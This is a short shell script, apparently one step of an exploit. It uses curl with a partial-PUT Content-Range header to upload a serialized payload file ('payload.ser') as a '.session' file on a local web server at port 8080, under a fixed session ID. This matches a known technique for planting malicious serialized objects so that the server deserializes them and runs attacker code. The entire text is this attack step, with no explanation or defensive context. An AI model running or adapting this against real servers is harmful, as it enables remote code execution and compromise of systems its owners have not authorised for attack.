SESSION_ID="CC6EF176B674733EFDEACCEA5429EB2D"
FILE="payload.ser"
FILESIZE=$(stat -c%s "$FILE")
END=$((FILESIZE - 1))

curl -X PUT --data-binary @"$FILE" \
  -H "Content-Range: bytes 0-${END}/${FILESIZE}" \
  "http://localhost:8080/${SESSION_ID}.session"
